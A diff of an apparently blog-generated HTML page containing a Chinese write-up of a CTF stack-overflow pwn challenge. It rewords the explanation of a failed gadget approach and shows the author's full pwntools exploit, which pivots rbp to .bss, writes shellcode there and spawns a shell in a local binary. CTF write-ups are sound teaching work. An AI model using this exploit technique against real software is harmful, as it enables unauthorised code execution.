@@ -25,7 +25,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/铁三pwn1/屏幕快照%202018-06-10%20下午5.08.21.png">
 <meta property="og:image" content="http://yoursite.com/铁三pwn1/屏幕快照%202018-06-10%20下午5.31.05.png">
-<meta property="og:updated_time" content="2018-06-10T09:34:30.481Z">
+<meta property="og:updated_time" content="2018-06-10T09:50:20.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一道铁三赛上的简单pwn题引发的思考">
 <meta name="twitter:description" content="栈溢出">
@@ -208,8 +208,8 @@
 <ol>
 <li>栈上执行shellcode</li>
 </ol>
-<p>搜索了一下，程序中没有jmp esp，call esp，这个路子断了，我们只能利用fgets，我们可能需要一些gadgets。</p>
-<p>问题是调用完fgets后，rdx的值变了，我们不能通过csu里面的通用gadget来重新调用fgets，因为我们不能正确地设置rdx的值。</p>
+<p>搜索了一下，但是程序中并没有jmp esp，call esp，我们只能利用fgets函数。</p>
+<p>但是调用完fgets后，rdx的值改变了，我们不能通过__libc_init_csu里的gadget来重新调用fgets，因为我们并不能正确地设置rdx的值。</p>
 <p>这个思路失效。</p>
 <ol start="2">
 <li>利用main函数原有特性修改写入地址</li>
@@ -223,7 +223,6 @@
 </ol>
 <p>这下思路就很明确了，以下是exp。</p>
 <h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./aleph1&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line"></span><br><span class="line">rbp_pop = 0x400538</span><br><span class="line">bss_addr = 0x601038</span><br><span class="line">main_offset_addr = 0x4005ce</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">playload = &apos;A&apos;*1032 + p64(rbp_pop) + p64(bss_addr + 0x400) + p64(main_offset_addr)</span><br><span class="line">p.sendline(playload)</span><br><span class="line"></span><br><span class="line">playload2 = shellcode + &apos;A&apos;*(1032 - len(shellcode)) + p64(bss_addr)</span><br><span class="line">p.sendline(playload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
     
   </div>
 
